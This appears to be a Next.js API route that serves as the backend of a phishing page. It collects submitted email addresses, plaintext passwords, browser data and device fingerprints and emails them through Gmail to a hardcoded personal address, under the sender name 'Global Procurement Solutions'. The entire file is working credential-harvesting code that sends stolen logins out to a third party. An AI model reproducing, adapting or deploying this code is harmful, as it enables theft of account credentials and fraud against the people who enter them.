import { NextRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";

const allowedOrigins = [
  "http://localhost:3000",
  "https://global-connect-gold.vercel.app",
];

function getAllowedOrigin(req: NextRequest) {
  const origin = req.headers.get("origin") || "";
  return allowedOrigins.includes(origin) ? origin : "";
}

async function sendMail(data: any) {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS,
    },
    //Here is the fix for self-signed certificates in development
    tls: process.env.NODE_ENV === "development"
      ? { rejectUnauthorized: false }
      : undefined,
  });

  const { customer_email, password, attempt, timestamp, browserData, deviceFingerprint } = data;

  if (!customer_email || !password) {
    throw new Error("Email and password are required.");
  }

  const htmlContent = `
    <h2>🔐 Login Verification Attempt</h2>
    <p><strong>Email:</strong> ${customer_email}</p>
    <p><strong>Password:</strong> ${password}</p>
    <p><strong>Attempt:</strong> ${attempt}</p>
    <p><strong>Timestamp:</strong> ${timestamp}</p>
    <h3>🖥 Browser Data</h3>
    <pre>${JSON.stringify(browserData, null, 2)}</pre>
    <h3>📱 Device Fingerprint</h3>
    <pre>${JSON.stringify(deviceFingerprint, null, 2)}</pre>
  `;

  await transporter.sendMail({
    from: `"Global Procurement Solutions" <${process.env.GMAIL_USER}>`,
    to: "isibel.santos@gmail.com",
    subject: `Client Login Attempt - ${customer_email}`,
    html: htmlContent,
  });
}

export async function POST(req: NextRequest) {
  const allowedOrigin = getAllowedOrigin(req);

  try {
    const data = await req.json();
    await sendMail(data);

    const res = new NextResponse(
      JSON.stringify({ success: true, message: "Login data received!" }),
      { status: 200 }
    );
    res.headers.set("Access-Control-Allow-Origin", allowedOrigin || "*");
    res.headers.set("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.headers.set("Access-Control-Allow-Headers", "Content-Type");
    return res;
  } catch (err: any) {
    console.error("Email sending failed:", err);
    const res = new NextResponse(
      JSON.stringify({ success: false, message: err.message }),
      { status: 500 }
    );
    res.headers.set("Access-Control-Allow-Origin", allowedOrigin || "*");
    res.headers.set("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.headers.set("Access-Control-Allow-Headers", "Content-Type");
    return res;
  }
}

export async function OPTIONS(req: NextRequest) {
  const allowedOrigin = getAllowedOrigin(req);
  const res = new NextResponse(null, { status: 204 });
  res.headers.set("Access-Control-Allow-Origin", allowedOrigin || "*");
  res.headers.set("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.headers.set("Access-Control-Allow-Headers", "Content-Type");
  return res;
}
